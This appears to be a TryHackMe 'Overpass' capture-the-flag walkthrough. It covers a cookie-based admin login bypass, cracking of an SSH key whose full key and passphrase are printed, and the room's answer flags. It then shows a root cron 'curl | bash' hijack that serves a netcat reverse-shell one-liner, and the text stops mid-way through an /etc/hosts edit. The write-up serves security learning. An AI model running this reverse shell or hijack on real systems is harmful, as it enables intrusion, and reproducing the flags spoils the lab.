---
tags:
  - THM
link: https://tryhackme.com/room/overpass
description: What happens when some broke CompSci students make a password manager?
image: https://tryhackme-images.s3.amazonaws.com/room-icons/2048656e072dd7caffe455ae2d44b65f.png
---
## Summary

| SECTION/TASK     | FLAG                                                                           |
| ---------------- | ------------------------------------------------------------------------------ |
| Task 1. Overpass | thm{65c1aaf000506e56996822c6281e6bf7}<br>thm{7f336f8c359dbac18d54fdd64ea753bb} |

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 1. Overpass

What happens when a group of broke Computer Science students try to make a password manager?  
Obviously a _perfect_ commercial success!

There is a TryHackMe subscription code hidden on this box. The first person to find and activate it will get a one month subscription for free! If you're already a subscriber, why not give the code to a friend?

UPDATE: The code is now claimed.  
The machine was slightly modified on 2020/09/25. This was only to improve the performance of the machine. It does not affect the process.
<div>
<br>
<br>
</div>

### Questions

#### Hack the machine and get the flag in user.txt
==thm{65c1aaf000506e56996822c6281e6bf7}==

##### Stage 1: Recon (Information Gathering)

###### 1.1 Connecting to the TryHackMe VPN

Before interacting with the target machine, connect to the TryHackMe VPN using my `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command:

`sudo openvpn <myprofile>.ovpn`

Once the VPN initialized successfully, confirm the connection by checking for the `Initialization Sequence Completed` message in the terminal.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

###### ## 1.2. Verifying the Target is Reachable

After connecting to the VPN, verify that the target machine is up and reachable by performing an ICMP ping test.

Command: `ping -c 4 <TARGET_IP>`

Breakdown:
- `-c 4` → sends 4 packets only (clean output, fast)

Output:

```shell
┌──(kali㉿kali)-[~]
└─$ ping -c 4 10.64.165.146
PING 10.64.165.146 (10.64.165.146) 56(84) bytes of data.
64 bytes from 10.64.165.146: icmp_seq=1 ttl=62 time=203 ms
64 bytes from 10.64.165.146: icmp_seq=2 ttl=62 time=202 ms
64 bytes from 10.64.165.146: icmp_seq=3 ttl=62 time=204 ms
64 bytes from 10.64.165.146: icmp_seq=4 ttl=62 time=202 ms

--- 10.64.165.146 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3056ms
rtt min/avg/max/mdev = 202.132/202.809/203.644/0.571 ms
```

A successful response confirms that the machine is active and accessible on the TryHackMe network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

##### Stage 2: Enumeration (Network & Port Scanning)

###### 2.1. Port Scan with Nmap

The first step in enumeration is to find out what services are running on the target machine. We'll use **Nmap** for a comprehensive scan of all TCP ports.

Command: `nmap -sV -sC -A -T4 -p- --min-rate 1000 -oN nmap.txt TARGET_IP`

Breakdown:
- **`nmap`**
    - **Description:** The utility itself.
    - **Purpose:** Starts the network scanning application.
- **`-sV`**
    - **Description:** Service Version Detection.
    - **Purpose:** Attempts to determine the version of the service running on open ports (e.g., Apache 2.4.41, OpenSSH 7.2p2).
- **`-sC`**
    - **Description:** Default Script Scan.
    - **Purpose:** Runs default, safe Nmap scripts to check for common vulnerabilities, weak passwords, or gather more details.
- **`-A`**
    - **Description:** Aggressive Scan.
    - **Purpose:** Enables OS detection, version detection, script scanning, and traceroute. Comprehensive but noisier.
- **`-T4`**
    - **Description:** Timing Template 4 (Aggressive).
    - **Purpose:** Speeds up the scan with more aggressive timing. Faster but may be less accurate or trigger IDS/IPS.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- **`--min-rate 1000`**
    - **Description:** Packet Rate Limit.
    - **Purpose:** Ensures at least 1,000 packets per second, speeding up large scans.
- **`-oN nmap.txt`**
    - **Description:** Output to Normal format. 
    - **Purpose:** Saves scan results to `nmap.txt` in human-readable format.
- **`TARGET_IP`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.

Output:

```shell
┌──(kali㉿kali)-[~/CS/THM/Overpass]
└─$ nmap -sV -sC -A -T4 -p- --min-rate 1000 -oN nmap.txt 10.64.165.146
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 22:06 EST
Nmap scan report for 10.64.165.146
Host is up (0.21s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 35:61:60:6a:30:27:fd:c8:21:ca:73:d1:ec:91:f3:b6 (RSA)
|   256 4e:17:20:4b:e6:bf:ea:3d:b1:a4:0a:42:e5:a9:41:6c (ECDSA)
|_  256 fd:33:33:4f:cb:23:9a:bc:97:73:9f:fc:26:2a:2f:d7 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   225.60 ms 192.168.128.1
2   ...
3   226.21 ms 10.64.165.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.78 seconds
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

###### 2.2. Enumeration of Web Services (Port 80)

Since **Port 80 (HTTP)** is open, the next logical step is to explore the web server. This typically involves checking the main page and running a **directory brute-forcing tool**.

Navigated to `http://<TARGET_IP>` in your browser to see the main page.

![[Pasted image 20251203061345.png]]
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

###### 2.3. Directory Brute-Forcing with Ffuf

Command:

`ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt `

Breakdown:
- **`ffuf*`*
    - **Description:** Fast web fuzzer.
    - **Purpose:** Performs fuzzing to discover hidden directories, files, or parameters on a web server.
- **`-u http://<TARGET_IP>/FUZZ`**
    - **Description:** Target URL with the **FUZZ** keyword.
    - **Purpose:** Tells ffuf where to inject words from the wordlist.
- **`-w /usr/share/seclists/Discovery/Web-Content/common.txt`**
    - **Description:** Wordlist option.
    - **Purpose:** Specifies the wordlist to use for fuzzing. In this case, a common directory/file discovery list from SecLists.

Output:

```shell
┌──(kali㉿kali)-[~/CS/THM/Overpass]
└─$ ffuf -u http://10.64.165.146/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.64.165.146/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

aboutus                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 205ms]
admin                   [Status: 301, Size: 42, Words: 3, Lines: 3, Duration: 201ms]
css                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 202ms]
downloads               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 204ms]
img                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 201ms]
index.html              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 203ms]
render/https://www.google.com [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 199ms]
:: Progress: [4746/4746] :: Job [1/1] :: 196 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

##### Stage 3: Web Enumeration & Initial Foothold

###### 3.1. Investigating the `/admin` Directory

The `ffuf` scan identified the `/admin` path, which is a high-priority target as it often contains sensitive information or a login portal.

Navigated to `http://<TARGET_IP>/admin` in your browser.

![[Pasted image 20251203062833.png]]

Testing Default Credentials:
- **Action:** Attempted to log in with the default credentials `admin:admin`.
- **Result:** The login failed, indicating that the administrator did not leave the default credentials configured.

![[Pasted image 20251203062735.png]]

Since the default login failed, I analyzed the application's behavior using my browser's Developer Tools. The network traffic revealed that the page utilizes client-side JavaScript (`login.js`) to handle the authentication request.

![[Pasted image 20251203064331.png]]

**Action:** View and inspect the source code for the login page and click on the linked `/login.js` file.

view-source:http://10.64.165.146/admin/:

```html
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Overpass</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="/css/main.css">
    <link rel="stylesheet" type="text/css" media="screen" href="/css/login.css">
    <link rel="icon" type="image/png" href="/img/overpass.png" />
    <script src="/main.js"></script>
    <script src="/login.js"></script>
    <script src="/cookie.js"></script>
</head>

<body onload="onLoad()">
    <nav>
        <img class="logo" src="/img/overpass.svg" alt="Overpass logo">
        <h2 class="navTitle"><a href="/">Overpass</a></h2>
        <a class="current" href="/aboutus">About Us</a>
        <a href="/downloads">Downloads</a>
    </nav>
    <div class="content">
        <h1>Administrator area</h1>
        <p>Please log in to access this content</p>
        <div>
            <h3 class="formTitle">Overpass administrator login</h1>
        </div>
        <form id="loginForm">
            <div class="formElem"><label for="username">Username:</label><input id="username" name="username" required></div>
            <div class="formElem"><label for="password">Password:</label><input id="password" name="password"
                    type="password" required></div>
            <button>Login</button>
        </form>
        <div id="loginStatus"></div>
    </div>
</body>

</html>
```

The `login.js` file contains the logic for the `login()` function, which determines the result of the authentication attempt:

```js
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

Breakdown:
- **`const response = await postData("/api/login", creds)`**
    - Sends the login credentials via POST to `/api/login`.
- **`const statusOrCookie = await response.text()`**
    - Reads the server response as plain text and stores it in `statusOrCookie`.
- **`if (statusOrCookie === "Incorrect credentials") { ... }`**
    - If the server returns exactly `"Incorrect credentials"`, the login is considered failed.
- **`else { Cookies.set("SessionToken", statusOrCookie); window.location = "/admin" }`**
    - **Critical Vulnerability:**
        - Any response _other than_ `"Incorrect credentials"` is automatically treated as a _valid session token_.
        - The text is stored as `SessionToken` in a cookie.
        - User is redirected to `/admin`, effectively granting admin access regardless of token validity.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

###### 3.2. Exploiting the Login Logic: Cookie Injection Bypass

**Action:** To exploit this, manually create a **`SessionToken`** cookie was  into the browser's storage using Developer Tools.

- **Cookie Name:** `SessionToken`
- **Cookie Value:** **(Left empty / set to an arbitrary, non-matching string)**
- **Result:** Injecting the cookie (even with an empty or non-specific value, as the flaw is in the client-side comparison) caused the client-side logic to treat the session as valid.

The injection was successful. Upon refreshing, the browser was granted access to the **"Overpass Administrator area"** .

![[Pasted image 20251202160720.png]]

The Key Discovery: Encrypted SSH Private Key.
- The administrator page revealed a message about an encrypted SSH key set up for user **James**, which is the key piece of information needed for the next stage.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

###### 3.3. Prepare and Crack the Key

The next step is to decrypt the private key to gain SSH access as the user `James`.

Save the key in local file.

```shell
┌──(kali㉿kali)-[~/CS/THM/Overpass]
└─$ vi id_rsa        

┌──(kali㉿kali)-[~/CS/THM/Overpass]
└─$ cat id_rsa        
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

Convert the SSH private key into a John-the-Ripper–readable hash

Command: `/usr/share/john/ssh2john.py id_rsa > hash`

Breakdown:
- `/usr/share/john/ssh2john.py`  
    A John the Ripper utility that converts SSH private keys into a hash format that John can crack.
- `id_rsa`  
    The SSH private key file you found.
- `>`  
    Redirects the output into a new file.
- `hash`  
    The output file that will contain the converted hash (usable by John).

```shell
┌──(kali㉿kali)-[~/CS/THM/Overpass]
└─$ /usr/share/john/ssh2john.py id_rsa > hash

┌──(kali㉿kali)-[~/CS/THM/Overpass]
└─$ ls
hash  id_rsa  nmap.txt

┌──(kali㉿kali)-[~/CS/THM/Overpass]
└─$ cat hash  
id_rsa:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b
```

Crack the SSH key.

Command: `john --wordlist=/usr/share/wordlists/rockyou.txt hash`

Breakdown:
- `--wordlist=/usr/share/wordlists/rockyou.txt`  
    Tells John to use the RockYou password list.
- `hash`  
    The file containing the key hash you want to crack.

```shell
┌──(kali㉿kali)-[~/CS/THM/Overpass]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)     
1g 0:00:00:00 DONE (2025-12-02 23:24) 11.11g/s 148622p/s 148622c/s 148622C/s pink25..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**Passphrase Discovered:** The passphrase for the encrypted private key is `james13`.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

##### Stage 4: Gaining User Access (SSH)

Use the `id_rsa` key file to gain SSH access as the user `James`.

```shell
┌──(kali㉿kali)-[~/CS/THM/Overpass]
└─$ ssh -i id_rsa james@10.66.180.249
The authenticity of host '10.66.180.249 (10.66.180.249)' can't be established.
ED25519 key fingerprint is SHA256:BOHelSBo2NFIGfWLLIcUZTDGdnrJ7ItZjT2uFTRKVo4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.66.180.249' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Dec  3 11:04:29 UTC 2025

  System load:  0.01               Processes:             97
  Usage of /:   36.6% of 18.53GB   Users logged in:       0
  Memory usage: 13%                IPv4 address for eth0: 10.66.180.249
  Swap usage:   0%


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

58 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@ip-10-66-180-249:~$
```

We're in!
The user flag is located in the home directory.

```shell
james@ip-10-65-152-254:~$ ls
todo.txt  user.txt
james@ip-10-65-152-254:~$ cat user.txt 
thm{65c1aaf000506e56996822c6281e6bf7}
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>


#### Escalate your privileges and get the flag in root.txt
==thm{7f336f8c359dbac18d54fdd64ea753bb}==

##### Stage 4: Privilege Escalation (Enumeration)

With user access established as `James`, the goal is to find a path to the root user.

###### 4.1. Analyzing `todo.txt` for Hints

The `todo.txt` file contains several tasks, one of which provides a crucial lead regarding the system's operation and another user.

```
james@ip-10-65-152-254:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
james@ip-10-65-152-254:~$ 
```

- **“Ask Paradox how he got the automated build script working and where the builds go.”**
    - Significance: This is the most critical hint. It points to an automated build script run by Paradox. Such scripts often run with high privileges (e.g., root via cron) and may expose sensitive file paths or configs relevant for privilege escalation.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

###### 4.2. Hunting for Automated Scripts/Files

Following the hint in `todo.txt` about an "automated build script," check the system's cron table.

Command: `cat /etc/crontab`

Output:

```shell
james@ip-10-65-152-254:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Critical Finding in `/etc/crontab`:

```
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
 
Analysis of the Cron Job:
- **Schedule:** `* * * * *`
    - The script runs **every minute**, providing a small and predictable exploitation window.
- **User:** `root`
    - The script executes with **root privileges**, so any command injection results in **full system compromise**.
- **Action:** `curl overpass.thm/...bash`
    - The script downloads and executes a payload, indicating a potential **remote code execution risk**.
 <div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

###### 4.3. The Command Injection Vulnerability

The vulnerability lies in the command structure:
1. The system uses **`overpass.thm`** to find the file.
2. The target machine resolves this hostname using the local **`/etc/hosts`** file or DNS.
3. Since the job runs as `root`, if we can control what the system resolves `overpass.thm` to, we can control what script is downloaded and executed as `root`.

Check `/etc/hosts` to see how the system is currently resolving `overpass.thm`.

Command: `cat /etc/hosts`

Output:

```shell
james@ip-10-65-152-254:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

The system resolves `overpass.thm` to **`127.0.0.1`** (localhost), meaning the cron job is downloading the script from the machine's own web server (running on Port 80, which we previously found).
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

###### 4.4. Exploitation: Hijacking the `root` Cron Job

The key to exploitation is hijacking the domain resolution of `overpass.thm` to point to the attacker's machine, thereby controlling the script that is executed as `root`.

To exploit this, the attacker machine (Kali) must host the malicious `buildscript.sh` file and listen for the reverse shell connection.

Set Up the Netcat Listener:

Command: `nc -lvnp 1234`

```shell
┌──(kali㉿kali)-[~/CS/THM/Overpass]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

> **you can use almost any port** for your reverse shell listener, but there are a few considerations:
> - **Non-Privileged Ports:** You should generally use ports above **1024** (e.g., `4444`, `9001`, `1234`). Ports 1-1024 are "well-known" and require root privileges to bind to them, which isn't necessary for a simple netcat listener on your Kali machine.
> - **Unused Ports:** The port must not be in use by any other service on your attacking machine.

Create the Malicious Payload: Obtain a reverse shell payload from [revshells.com](https://www.revshells.com/). Enter the attacker IP, port number and change the payload to your preference and shell to /bin/bash as shown below. Copy the payload.

![[Pasted image 20251203150324.png]]

Create the Web Structure: Create the directory path that matches the URL used by the cron job: `downloads/src/`. Then create the `buildscript.sh` file and paste the reverse shell payload into it.

```shell
┌──(kali㉿kali)-[~/CS/THM/Overpass]
└─$ mkdir -p downloads/src                                       
 
┌──(kali㉿kali)-[~/CS/THM/Overpass]
└─$ cd downloads/src                                             

┌──(kali㉿kali)-[~/…/THM/Overpass/downloads/src]
└─$ vi buildscript.sh

┌──(kali㉿kali)-[~/…/THM/Overpass/downloads/src]
└─$ cat buildscript.sh                                           
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.157.156 1234 >/tmp/f
```

Start a python **webserver**: Start a simple Python HTTP server on the standard HTTP port (`**Port 80**`) from the root directory of the payload (`~/.../Overpass/`).

> You need the web server (Port 80) to impersonate the legitimate `overpass.thm` server and successfully serve the malicious `buildscript.sh` payload when the cron job requested it.

Command: `python3 -m http.server 80`

Output:

```shell
┌──(kali㉿kali)-[~/…/THM/Overpass/downloads/src]
└─$ python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

> **Tip:** If you don't launch the Python web server from the directory containing the necessary file path (`downloads/src/`), the cron job will fail to retrieve the payload, and you won't get a root shell.
> 
> **Explanation:** The Cron job on the target machine uses the exact, full path specified in the `/etc/crontab` entry: `overpass.thm/downloads/src/buildscript.sh`.
> 
> When you run `python3 -m http.server 80` from a specific directory (in your case, `~/CS/THM/Overpass`), that directory becomes the **root** (`/`) of your web server. Therefore, the server must be launched from the directory that **contains** the `downloads` folder, allowing the URL path to map correctly:
> 
> - **Target Request:** `GET /downloads/src/buildscript.sh HTTP/1.1`
> - **Server Root (`/`):** `~/CS/THM/Overpass`
> - **File Served:** `~/CS/THM/Overpass/downloads/src/buildscript.sh`
> 
> If you ran the server from your home directory (`~`), the server would look for the file at `~/downloads/src/buildscript.sh`, which is incorrect based on your directory structure.

Edit the `/etc/hosts` File: On the target, edit the `/etc/hosts` file by replacing the IP for the domain `overpass.thm` to the attacker IP address.

```shell
james@ip-10-66-180-249:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
